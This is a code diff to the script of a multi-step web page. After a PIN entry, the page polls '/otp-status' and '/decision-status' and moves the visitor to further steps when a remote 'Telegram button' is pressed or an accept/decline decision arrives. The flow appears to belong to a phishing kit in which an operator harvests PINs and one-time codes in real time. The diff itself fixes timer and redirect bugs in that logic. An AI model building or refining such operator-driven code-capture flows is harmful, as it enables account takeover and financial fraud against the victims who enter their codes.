@@ -28,47 +28,50 @@
 
 <script>
 
-// FLOW A: STEP4 → STEP5
+// FLOW A: STEP4 → STEP5 (5 seconds delay)
 if (localStorage.getItem("firstProcess") === "yes") {
 
     localStorage.removeItem("firstProcess");
 
     setTimeout(() => {
         window.location.href = "step5.html";
-    }, 3000);
+    }, 5000); // ✅ fixed to 5 seconds
 }
 
-// ===== FLOW B: AFTER PIN → WAIT FOR TELEGRAM =====
-if (localStorage.getItem("fromPin") === "yes") {
 
-  setInterval(async () => {
+// ===== FLOW B: AFTER PIN → WAIT FOR TELEGRAM =====
+else if (localStorage.getItem("fromPin") === "yes") {
+
+  const checker = setInterval(async () => {
     try {
         const res = await fetch("/otp-status");
         const data = await res.json();
 
         console.log("OTP STATUS:", data);
 
-        // 🔥 FORCE CHECK (handles string + number)
+        // 🔥 go to step5 if needed
         if (data.otp == 5) {
-    localStorage.removeItem("fromPin");
-    clearInterval(this);
-    window.location.href = "step5.html";
-}
+            clearInterval(checker);
+            window.location.href = "step5.html";
+        }
 
+        // 🔥 go to step6 when Telegram button pressed
         if (data.otp == 6) {
-    localStorage.removeItem("fromPin");
-    clearInterval(this); // stop loop
-    window.location.href = "step6.html";
-}
+            clearInterval(checker);
+            localStorage.removeItem("fromPin"); // ✅ remove ONLY here
+            window.location.href = "step6.html";
+        }
 
         const decisionRes = await fetch("/decision-status");
         const decisionData = await decisionRes.json();
 
         if (decisionData.decision === "accept") {
+            clearInterval(checker);
             window.location.href = "dashboard.html";
         }
 
         if (decisionData.decision === "decline") {
+            clearInterval(checker);
             localStorage.clear();
             window.location.href = "step5.html";
         }
@@ -76,10 +79,10 @@ if (localStorage.getItem("fromPin") === "yes") {
     } catch (err) {
         console.log("Waiting...");
     }
-}, 2000);  
+  }, 2000);
 
 }
-</script>
 
+</script>
 </body>
 </html>
